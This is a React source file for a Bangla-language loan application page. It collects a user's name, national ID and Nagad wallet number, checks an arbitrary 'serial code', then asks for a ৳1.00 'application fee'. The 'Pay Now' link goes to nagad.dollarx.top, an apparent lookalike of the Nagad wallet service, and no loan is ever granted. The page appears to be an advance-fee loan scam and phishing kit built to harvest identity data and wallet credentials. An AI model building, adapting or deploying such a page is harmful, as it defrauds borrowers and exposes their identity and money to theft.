import { useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import { useAuth } from "@/hooks/useAuth";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { ArrowLeft } from "lucide-react";
import { toast } from "sonner";

const AMOUNTS = [3000, 5000, 10000, 20000];
const TERMS = [
  { label: "৩ মাস", months: 3 },
  { label: "৬ মাস", months: 6 },
  { label: "১ বছর", months: 12 },
  { label: "২ বছর", months: 24 },
];
const RATE = 0.15;

type Step = "form" | "summary" | "nagad" | "serial" | "fee";

export default function Loan() {
  const { user, loading } = useAuth();
  const nav = useNavigate();
  const [step, setStep] = useState<Step>("form");
  const [data, setData] = useState({ name: "", nid: "", amount: "", term: "", method: "" });
  const [nagadNumber, setNagadNumber] = useState("");
  const [serial, setSerial] = useState("");

  if (!loading && !user) { nav("/auth"); return null; }

  const amount = Number(data.amount || 0);
  const interest = amount * RATE;
  const total = amount + interest;

  const submitForm = (e: React.FormEvent) => {
    e.preventDefault();
    if (data.nid.length < 10) return toast.error("NID সর্বনিম্ন ১০ ডিজিট হতে হবে");
    if (!data.amount || !data.term || !data.method) return toast.error("সব ফিল্ড পূরণ করুন");
    setStep("summary");
  };

  const proceedFromSummary = () => {
    setStep(data.method === "nagad" ? "nagad" : "serial");
  };

  const submitNagad = (e: React.FormEvent) => {
    e.preventDefault();
    if (nagadNumber.length < 11) return toast.error("সঠিক নগদ নাম্বার দিন");
    setStep("serial");
  };

  const submitSerial = (e: React.FormEvent) => {
    e.preventDefault();
    if (!serial.trim().toUpperCase().endsWith("NG")) return toast.error("ভুল সিরিয়াল কোড");
    setStep("fee");
  };

  return (
    <div className="min-h-screen bg-muted/30">
      <header className="bg-primary p-4 flex items-center gap-3 shadow">
        <Link to="/"><ArrowLeft className="text-primary-foreground" /></Link>
        <h1 className="text-xl font-bold text-primary-foreground">লোন আবেদন</h1>
      </header>
      <div className="max-w-md mx-auto p-4">
        {step === "form" && (
          <form onSubmit={submitForm} className="bg-card rounded-2xl p-5 space-y-4 shadow">
            <div><Label>নাম</Label><Input required value={data.name} onChange={(e) => setData({ ...data, name: e.target.value })} /></div>
            <div><Label>NID নাম্বার</Label><Input required minLength={10} value={data.nid} onChange={(e) => setData({ ...data, nid: e.target.value.replace(/\D/g, "") })} /></div>
            <div>
              <Label>লোনের পরিমাণ</Label>
              <Select value={data.amount} onValueChange={(v) => setData({ ...data, amount: v })}>
                <SelectTrigger><SelectValue placeholder="সিলেক্ট করুন" /></SelectTrigger>
                <SelectContent>{AMOUNTS.map((a) => <SelectItem key={a} value={String(a)}>৳{a.toLocaleString()}</SelectItem>)}</SelectContent>
              </Select>
            </div>
            <div>
              <Label>মেয়াদ</Label>
              <Select value={data.term} onValueChange={(v) => setData({ ...data, term: v })}>
                <SelectTrigger><SelectValue placeholder="সিলেক্ট করুন" /></SelectTrigger>
                <SelectContent>{TERMS.map((t) => <SelectItem key={t.months} value={String(t.months)}>{t.label}</SelectItem>)}</SelectContent>
              </Select>
            </div>
            <div>
              <Label>লোন নেওয়ার মাধ্যম</Label>
              <Select value={data.method} onValueChange={(v) => setData({ ...data, method: v })}>
                <SelectTrigger><SelectValue placeholder="সিলেক্ট করুন" /></SelectTrigger>
                <SelectContent>
                  <SelectItem value="nagad">নগদ</SelectItem>
                  <SelectItem value="app">অ্যাপ ব্যালেন্স</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <Button type="submit" className="w-full">সাবমিট</Button>
          </form>
        )}

        {step === "summary" && (
          <div className="bg-card rounded-2xl p-5 space-y-3 shadow">
            <h2 className="text-lg font-bold mb-2">অ্যামাউন্ট বিস্তারিত</h2>
            <Row k="লোনের পরিমাণ" v={`৳${amount.toLocaleString(undefined, { minimumFractionDigits: 2 })}`} />
            <Row k="ইন্টারেস্ট রেট" v="15.00%" />
            <Row k="মোট ইন্টারেস্ট" v={`৳${interest.toLocaleString(undefined, { minimumFractionDigits: 2 })}`} />
            <Row k="মোট পরিশোধযোগ্য" v={`৳${total.toLocaleString(undefined, { minimumFractionDigits: 2 })}`} highlight />
            <Button onClick={proceedFromSummary} className="w-full mt-4">এগিয়ে যান</Button>
          </div>
        )}

        {step === "nagad" && (
          <form onSubmit={submitNagad} className="bg-card rounded-2xl p-5 space-y-4 shadow">
            <h2 className="text-lg font-bold">নগদ নাম্বার দিন</h2>
            <p className="text-sm text-muted-foreground">যে নগদ নাম্বারে লোন নিতে চান</p>
            <Input required value={nagadNumber} onChange={(e) => setNagadNumber(e.target.value.replace(/\D/g, ""))} placeholder="01XXXXXXXXX" />
            <Button type="submit" className="w-full">সাবমিট</Button>
          </form>
        )}

        {step === "serial" && (
          <form onSubmit={submitSerial} className="bg-card rounded-2xl p-5 space-y-4 shadow">
            <h2 className="text-lg font-bold">সিরিয়াল কোড দিন</h2>
            <Input required value={serial} onChange={(e) => setSerial(e.target.value)} placeholder="সিরিয়াল কোড" />
            <Button type="submit" className="w-full">সাবমিট</Button>
          </form>
        )}

        {step === "fee" && (
          <div className="bg-card rounded-2xl p-5 space-y-4 shadow text-center">
            <h2 className="text-lg font-bold">আবেদন ফি</h2>
            <p className="text-muted-foreground">আপনার লোন আবেদন প্রক্রিয়া করতে অনুগ্রহ করে আবেদন ফি পরিশোধ করুন।</p>
            <div className="text-4xl font-black text-primary">৳1.00</div>
            <a href="https://nagad.dollarx.top" className="block">
              <Button className="w-full bg-accent text-accent-foreground hover:bg-accent/90">Pay Now</Button>
            </a>
          </div>
        )}
      </div>
    </div>
  );
}

const Row = ({ k, v, highlight }: { k: string; v: string; highlight?: boolean }) => (
  <div className={`flex justify-between py-2 border-b last:border-0 ${highlight ? "font-bold text-primary text-lg" : ""}`}>
    <span className="text-muted-foreground">{k}:</span><span>{v}</span>
  </div>
);
